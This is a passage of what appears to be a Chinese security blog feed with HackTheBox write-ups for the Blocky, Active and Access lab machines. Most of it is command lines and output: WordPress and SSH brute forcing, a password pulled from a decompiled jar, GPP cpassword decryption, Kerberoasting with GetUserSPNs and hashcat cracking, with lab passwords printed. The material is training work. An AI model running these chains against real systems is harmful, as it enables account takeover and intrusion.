class="hljs-string">&#x27;mod_copy&#x27;</span> Remote Command Execution                     | exploits<span class="hljs-regexp">/linux/</span>remote/<span class="hljs-number">36803</span>.py<br><br>msfconsole<br>use exploit<span class="hljs-regexp">/unix/</span>ftp/proftpd_modcopy_exec<br>执行失败<br></code></pre></div></td></tr></table></figure><h2 id="22"><a href="#22" class="headerlink" title="22"></a>22</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">python ssh.py --userList <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>linux-user.txt --outputFile out.txt <span class="hljs-number">10.10</span>.<span class="hljs-number">10.37</span><br><br>ssh root@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.37</span><br>ssh_exchange_identification: Connection closed by remote host<br></code></pre></div></td></tr></table></figure><p>ssh禁止过多的连接</p><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Server</span>: Apache/<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">18</span> (Ubuntu)<br><span class="hljs-attribute">WordPress</span> version <span class="hljs-number">4</span>.<span class="hljs-number">8</span> <br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">10.10.10.37:80</span><br><span class="hljs-attribute">wpscan</span> --url <span class="hljs-number">10.10.10.37</span> --enumerate p<br><span class="hljs-attribute">wpscan</span> --url <span class="hljs-number">10.10.10.37</span> --enumerate p --enumerate u<br><br><span class="hljs-attribute">searchsploit</span> wordpress Host Header Injection<br><br><span class="hljs-attribute">WordPress</span> <span class="hljs-number">2</span>.<span class="hljs-number">3</span>-<span class="hljs-number">4</span>.<span class="hljs-number">8</span>.<span class="hljs-number">3</span> - Host Header Injection in Password Reset<br></code></pre></div></td></tr></table></figure><p>手动检查了一个wpscan提示的可能漏洞，检查并没有，于是用burp scanner扫描一遍再说。</p><h4 id="useful-info"><a href="#useful-info" class="headerlink" title="useful info"></a>useful info</h4><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">phpadmin vesion4.<span class="hljs-number">5.4</span>（burp scanner扫描结果）<br>WordPress/<span class="hljs-number">4.8</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.37</span><span class="hljs-regexp">/phpmyadmin/i</span>ndex.php<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.37</span>/wp-login.php<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.37</span>/wp-links-opml.php<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.37</span><span class="hljs-regexp">/plugins/</span><br></code></pre></div></td></tr></table></figure><h2 id="25565"><a href="#25565" class="headerlink" title="25565"></a>25565</h2><p>searchsploit Minecraft<br>经过搜索，好像是一个游戏，“《我的世界》是一款沙盒游戏。。。”</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -nv <span class="hljs-number">10.10.10.37</span> <span class="hljs-number">25565</span><br><span class="hljs-attribute">wget</span> http://<span class="hljs-number">10.10.10.37:25565</span><br></code></pre></div></td></tr></table></figure><hr><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">wpscan <span class="hljs-comment">--url 10.10.10.37 --enumerate</span><br>[+] Notch<br> | Detected <span class="hljs-keyword">By</span>: Rss Generator (Passive Detection)<br> | Confirmed <span class="hljs-keyword">By</span>: <span class="hljs-keyword">Login</span> Error Messages (Aggressive Detection)<br></code></pre></div></td></tr></table></figure><p>获得一个用户名</p><ul><li>trying1: 弱口令检查<br>wpscan –url <a href="http://10.10.10.37/wp-login.php">http://10.10.10.37/wp-login.php</a> –wordlist /usr/share/wordlists/rockyou.txt –username Notch<br>失败</li></ul><hr><p>在plugin目录下下载jar文件，unzip解压，jad反编译，获得一个口令<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-19/11.PNG" alt="11"></p><p>以/root/8YsqfCTnvxAUeduzjNSXe22，登录phpmyadmin成功。</p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> root@<span class="hljs-number">10.10.10.37</span><br>ssh Notch@<span class="hljs-number">10.10.10.37</span><br>ssh notch@<span class="hljs-number">10.10.10.37</span>，成功<br></code></pre></div></td></tr></table></figure><p>提权：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">whoami 以notch普通用户登陆<br><br>sudo <span class="hljs-operator">-</span>l <br>响应，说明该用户可以运行任何命令<br><span class="hljs-keyword">User</span> notch may run the following commands <span class="hljs-keyword">on</span> Blocky:<br>    (<span class="hljs-keyword">ALL</span> : <span class="hljs-keyword">ALL</span>) <span class="hljs-keyword">ALL</span><br><br><span class="hljs-keyword">groups</span> notch 查看该用户所在的组，有sudo组<br><br>notch : notch adm cdrom sudo dip plugdev lxd lpadmin sambashare<br><br>sudo su<br></code></pre></div></td></tr></table></figure><p>以前用过<a href="https://whale3070.github.io/training/2017/11/02/g0rmint-%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%86%99%E5%85%A5log-%E6%8F%90%E6%9D%83/">该方式提权</a>。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一次尝试了java反汇编</p><p>wpscan可以使用不带参数的–enumerate，来枚举所有可能漏洞。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>linux os</tag>
      
      <tag>cms</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Active（windows smb共享硬盘）</title>
    <link href="/2019/01/15/x/"/>
    <url>/2019/01/15/x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：<a href="https://whale3070.github.io/tools/2016/12/12/x/">smbclient</a></p><h2 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h2><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-number">53</span><span class="hljs-operator">/</span>tcp    <span class="hljs-keyword">open</span>  domain        Microsoft DNS <span class="hljs-number">6.1</span><span class="hljs-number">.7601</span><br><span class="hljs-operator">|</span> dns<span class="hljs-operator">-</span>nsid: <br><span class="hljs-operator">|</span>_  bind.version: Microsoft DNS <span class="hljs-number">6.1</span><span class="hljs-number">.7601</span> (<span class="hljs-number">1</span>DB15D39)<br><span class="hljs-number">88</span><span class="hljs-operator">/</span>tcp    <span class="hljs-keyword">open</span>  kerberos<span class="hljs-operator">-</span>sec  Microsoft Windows Kerberos (server <span class="hljs-type">time</span>: <span class="hljs-number">2019</span><span class="hljs-number">-01</span><span class="hljs-number">-02</span> <span class="hljs-number">04</span>:<span class="hljs-number">44</span>:<span class="hljs-number">03</span>Z)<br><span class="hljs-number">135</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC<br><span class="hljs-number">139</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  netbios<span class="hljs-operator">-</span>ssn   Microsoft Windows netbios<span class="hljs-operator">-</span>ssn<br><span class="hljs-number">389</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: <span class="hljs-keyword">Default</span><span class="hljs-operator">-</span><span class="hljs-keyword">First</span><span class="hljs-operator">-</span>Site<span class="hljs-operator">-</span>Name)<br><span class="hljs-number">445</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  microsoft<span class="hljs-operator">-</span>ds?<br><span class="hljs-number">464</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  kpasswd5?<br><span class="hljs-number">593</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  ncacn_http    Microsoft Windows RPC <span class="hljs-keyword">over</span> HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">636</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  tcpwrapped<br><span class="hljs-number">3268</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: <span class="hljs-keyword">Default</span><span class="hljs-operator">-</span><span class="hljs-keyword">First</span><span class="hljs-operator">-</span>Site<span class="hljs-operator">-</span>Name)<br><span class="hljs-number">3269</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  tcpwrapped<br><span class="hljs-number">5722</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC<br><span class="hljs-number">9389</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  mc<span class="hljs-operator">-</span>nmf        .NET Message Framing<br><span class="hljs-number">47001</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP<span class="hljs-operator">/</span>UPnP)<br><span class="hljs-operator">|</span>_http<span class="hljs-operator">-</span>server<span class="hljs-operator">-</span>header: Microsoft<span class="hljs-operator">-</span>HTTPAPI<span class="hljs-operator">/</span><span class="hljs-number">2.0</span><br><span class="hljs-operator">|</span>_http<span class="hljs-operator">-</span>title: <span class="hljs-keyword">Not</span> Found<br><span class="hljs-number">49152</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49153</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49154</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49155</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49157</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  ncacn_http    Microsoft Windows RPC <span class="hljs-keyword">over</span> HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">49158</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49169</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49171</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49182</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC<br>Service Info: Host: DC; OS: Windows; CPE: cpe:<span class="hljs-operator">/</span>o:microsoft:windows<br></code></pre></div></td></tr></table></figure><h2 id="analysing"><a href="#analysing" class="headerlink" title="analysing"></a>analysing</h2><p>参考资料：<a href="https://zh.wikipedia.org/wiki/Active_Directory">windows active directory</a></p><p><code>53/tcp    open  domain        Microsoft DNS 6.1.7601</code><br>以上结果说明了，这是一台域名服务器（Domain Name System server），active.htb</p><p>搜索一下“Microsoft DNS 6.1.7601”，即可得知系统版本——Windows 2008 R2 Standard version</p><h2 id="smb协议探测（Server-Message-Block-protocol）"><a href="#smb协议探测（Server-Message-Block-protocol）" class="headerlink" title="smb协议探测（Server Message Block protocol）"></a>smb协议探测（Server Message Block protocol）</h2><p>445端口是用来共享文件夹或者打印机的</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> --script safe -p<span class="hljs-number">445</span> <span class="hljs-number">10.10.10.100</span><br><br><span class="hljs-attribute">smbclient</span> -L //<span class="hljs-number">10.10.10.100</span><br><br><span class="hljs-attribute">smbmap</span> -H <span class="hljs-number">10.10.10.100</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15/8.PNG" alt="8"></p><p>smbclient //10.10.10.100/Replication<br>WARNING: The “syslog” option is deprecated<br>protocol negotiation failed: NT_STATUS_CONNECTION_RESET</p><h2 id="smbmap"><a href="#smbmap" class="headerlink" title="smbmap"></a>smbmap</h2><p>SMBMap - Samba Share Enumerator</p><p>用smbmap -h可以查看帮助文档</p><p>-R是递归列出某目录<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15/9.PNG" alt="9"></p><figure class="highlight brainfuck"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs brainfuck"><span class="hljs-comment">获得信息：</span><br><span class="hljs-comment"></span><span class="hljs-string">.</span><span class="hljs-comment">\\active</span><span class="hljs-string">.</span><span class="hljs-comment">htb\Policies\&#123;31B2F340</span><span class="hljs-literal">-</span><span class="hljs-comment">016D</span><span class="hljs-literal">-</span><span class="hljs-comment">11D2</span><span class="hljs-literal">-</span><span class="hljs-comment">945F</span><span class="hljs-literal">-</span><span class="hljs-comment">00C04FB984F9&#125;\MACHINE\Preferences\Groups\</span><br><span class="hljs-comment">dr</span>--<span class="hljs-comment">r</span>--<span class="hljs-comment">r</span>--                <span class="hljs-comment">0</span> <span class="hljs-comment">Sat</span> <span class="hljs-comment">Jul</span> <span class="hljs-comment">21</span> <span class="hljs-comment">18:37:44</span> <span class="hljs-comment">2018</span><span class="hljs-string">.</span><br><span class="hljs-comment">dr</span>--<span class="hljs-comment">r</span>--<span class="hljs-comment">r</span>--                <span class="hljs-comment">0</span> <span class="hljs-comment">Sat</span> <span class="hljs-comment">Jul</span> <span class="hljs-comment">21</span> <span class="hljs-comment">18:37:44</span> <span class="hljs-comment">2018</span><span class="hljs-string">.</span><span class="hljs-string">.</span><br><span class="hljs-comment"></span><span class="hljs-literal">-</span><span class="hljs-comment">r</span>--<span class="hljs-comment">r</span>--<span class="hljs-comment">r</span>--              <span class="hljs-comment">533</span> <span class="hljs-comment">Sat</span> <span class="hljs-comment">Jul</span> <span class="hljs-comment">21</span> <span class="hljs-comment">18:38:11</span> <span class="hljs-comment">2018Groups</span><span class="hljs-string">.</span><span class="hljs-comment">xml</span><br></code></pre></div></td></tr></table></figure><p>下载文件: <code>smbmap -H 10.10.10.100 -R Replication -A Groups.xml</code></p><figure class="highlight abnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs abnf">获得信息<span class="hljs-number">2</span>：<br><span class="hljs-attribute">cpassword</span>=<span class="hljs-string">&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</span><br><span class="hljs-attribute">userName</span>=<span class="hljs-string">&quot;active.htb\SVC_TGS&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="破解cpassword"><a href="#破解cpassword" class="headerlink" title="破解cpassword"></a>破解cpassword</h2><p>参考资料：<a href="https://www.youtube.com/watch?v=ks4aNbArOtk">Exploiting GPP - Credential Storage in Groups.xml File</a><br><a href="https://github.com/reider-roque/pentest-tools/blob/master/password-cracking/gpprefdecrypt/gpprefdecrypt.ps1">工具下载<strong>gpprefdecrypt.ps1</strong></a></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">cmd</span>.exe 右键以管理员身份运行<br><span class="hljs-attribute">cd</span> C:\Users\whale\Desktop<br><span class="hljs-attribute">powershell</span>.exe ./gpprefdecrypt.ps<span class="hljs-number">1</span> edBSHOwhZLTjt/QS<span class="hljs-number">9</span>FeIcJ<span class="hljs-number">83</span>mjWA<span class="hljs-number">98</span>gw<span class="hljs-number">9</span>guKOhJOdcqh+ZGMeXOsQbCpZ<span class="hljs-number">3</span>xUjTLfCuNH<span class="hljs-number">8</span>pG<span class="hljs-number">5</span>aSVYdYw/NglVmQ<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15/10.PNG" alt="10"><br><code>GPPstillStandingStrong2k18</code></p><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>期间出现windows不允许执行ps1脚本。<br>解决办法：以管理员身份运行powershell，输入以下命令，然后输入Y。</p><figure class="highlight dsconfig"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dsconfig"><span class="hljs-built_in">set-executionpolicy</span> <span class="hljs-string">remotesigned</span><br></code></pre></div></td></tr></table></figure><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>kali工具破解：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">gpp</span>-decrypt edBSHOwhZLTjt/QS<span class="hljs-number">9</span>FeIcJ<span class="hljs-number">83</span>mjWA<span class="hljs-number">98</span>gw<span class="hljs-number">9</span>guKOhJOdcqh+ZGMeXOsQbCpZ<span class="hljs-number">3</span>xUjTLfCuNH<span class="hljs-number">8</span>pG<span class="hljs-number">5</span>aSVYdYw/NglVmQ<br></code></pre></div></td></tr></table></figure><h2 id="域用户提权"><a href="#域用户提权" class="headerlink" title="域用户提权"></a>域用户提权</h2><p><code>smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100</code><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15/11.PNG" alt="11"></p><p>可以发现，多了三个目录可读。依次检查这些目录，获得了user.txt。<br><code>smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100 -R Users -A user.txt</code></p><p><strong>Kerberoasting</strong><br><a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py">GetUserSPNs.py</a></p><p>Kerberoasting是从票据分发服务中破解hash，来获得明文密码。</p><p>Kerberos身份验证使用服务主体名称（SPN）来标识关联的帐户。</p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">ldapsearch -x -h <span class="hljs-number">10.10</span>.<span class="hljs-number">10.100</span> -p <span class="hljs-number">389</span> -D <span class="hljs-string">&#x27;SVC_TGS&#x27;</span> -w <span class="hljs-string">&#x27;GPPstillStandingStrong2k18&#x27;</span> -b <span class="hljs-string">&quot;dc=active,dc=htb&quot;</span> -s sub <span class="hljs-string">&quot;(&amp;(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))&quot;</span> serviceprincipalname | <span class="hljs-keyword">grep</span> -B <span class="hljs-number">1</span> servicePrincipalName<br><br>locate GetUserSPNs.py<br><br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/doc/</span>python-impacket<span class="hljs-regexp">/examples/G</span>etUserSPNs.py -request -dc-ip <span class="hljs-number">10.10</span>.<span class="hljs-number">10.100</span> active.htb/SVC_TGS -save -outputfile GetUserSPNs.out<br><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15/12.PNG" alt="12"></p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">apt install exim4-config<br>apt-<span class="hljs-builtin-name">get</span> install pocl-opencl-icd<br>apt-<span class="hljs-builtin-name">get</span> install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev<br>apt-<span class="hljs-builtin-name">get</span><span class="hljs-built_in"> upgrade </span>hashcat 更新了一下hashcat，然后就可以正常运行了<br>hashcat -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force --potfile-<span class="hljs-builtin-name">disable</span><br><br>john --format:krb5tgs GetUserSPNs.out <span class="hljs-attribute">--wordlist</span>=/usr/share/wordlists/rockyou.txt<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15/13.PNG" alt="13"><br>如果字典里没有正确的密码，hashcat会提示</p><figure class="highlight inform7"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs inform7"><span class="hljs-comment">[s]</span>tatus <span class="hljs-comment">[p]</span>ause <span class="hljs-comment">[b]</span>ypass <span class="hljs-comment">[c]</span>heckpoint <span class="hljs-comment">[q]</span>uit =&gt; <br></code></pre></div></td></tr></table></figure><p>这个时候就要换字典，再次尝试，或者放弃。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15/14.PNG" alt="14"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>工作组和域<br><a href="https://www.douban.com/note/527276260/">工作组和域的区别</a></p><p>域一般用在比较大的网络里，需要一台域控服务器，其他计算机要互相访问就要经过它。</p><p>工作组比较小（网上邻居），没有控制彼此访问的服务器。</p><p>下次继续学习windows域渗透。。。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>windows</tag>
      
      <tag>port 445</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Access（port:23-telnet登入反弹cmd）</title>
    <link href="/2019/01/11/x/"/>
    <url>/2019/01/11/x/</url>
    
    <content type="html"><![CDATA[<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Nmap</span> scan report for <span class="hljs-number">10.10.10.98</span><br><span class="hljs-attribute">Host</span> is up (<span class="hljs-number">0</span>.<span class="hljs-number">13</span>s latency).<br><span class="hljs-attribute">Not</span> shown: <span class="hljs-number">997</span> filtered ports<br><span class="hljs-attribute">PORT</span>   STATE SERVICE<br><span class="hljs-attribute">21</span>/tcp open  ftp<br><span class="hljs-attribute">23</span>/tcp open  telnet<br><span class="hljs-attribute">80</span>/tcp open  http<br><br><span class="hljs-attribute">nmap</span> -sV -p <span class="hljs-number">21</span>,<span class="hljs-number">23</span>,<span class="hljs-number">80</span> <span class="hljs-number">10.10.10.98</span><br><span class="hljs-attribute">21</span>/tcp open  ftp     Microsoft ftpd<br><span class="hljs-attribute">23</span>/tcp open  telnet?<br><span class="hljs-attribute">80</span>/tcp open  http    Microsoft IIS httpd <span class="hljs-number">7</span>.<span class="hljs-number">5</span><br></code></pre></div></td></tr></table></figure><p>os: 通过搜索关键词”IIS 7.5“，可得知系统版本为windows 7</p><h2 id="21"><a href="#21" class="headerlink" title="21"></a>21</h2><p>ftp匿名登陆</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">ls</span><br><span class="hljs-attribute">08</span>-<span class="hljs-number">23</span>-<span class="hljs-number">18</span>  <span class="hljs-number">08</span>:<span class="hljs-number">16</span>PM       &lt;DIR&gt;          Backups<br><span class="hljs-attribute">08</span>-<span class="hljs-number">24</span>-<span class="hljs-number">18</span>  <span class="hljs-number">09</span>:<span class="hljs-number">00</span>PM       &lt;DIR&gt;          Engineer<br></code></pre></div></td></tr></table></figure><p>获得了两个文件<code>Access Control.zip、backup.mdb</code><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-11/0.png" alt="0"></p><h4 id="ftp传输报错"><a href="#ftp传输报错" class="headerlink" title="ftp传输报错"></a>ftp传输报错</h4><figure class="highlight mercury"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mercury">WARNING! <span class="hljs-number">28296</span> bare linefeeds received in ASCII <span class="hljs-keyword">mode</span><br>File may <span class="hljs-built_in">not</span> have transferred correctly.<br><span class="hljs-number">226</span> Transfer complete.<br></code></pre></div></td></tr></table></figure><p>于是查看是否传输成功</p><p>mdb文件的大小</p><figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">服务器文件：<br>08-23-18  08:16PM             <span class="hljs-number"> 5652480 </span>backup.mdb<br><br>本地文件：<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 5651666 </span>Dec<span class="hljs-number"> 27 </span>21:16 backup.mdb<br><br></code></pre></div></td></tr></table></figure><p>尝试了很多遍，猜测是Binary or ASCII Mode，文件传输模式的问题。</p><p>好麻烦，干脆不用命令行传输了，下载一个ftp客户端。</p><p><a href="http://www.coreftp.com/docs/web1/Ascii_vs_Binary_transfers.htm">传输格式问题</a><br>如果要将文件从Windows传输到基于Unix的服务器，Ascii模式将删除每行末尾的CR（回车）字符。  您可能会注意到您上传的文件小于本地文件</p><hr><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">hydra -L /root/Desktop/<span class="hljs-number">86</span>/<span class="hljs-keyword">user</span>.txt -P /usr/<span class="hljs-keyword">share</span>/wordlists/<span 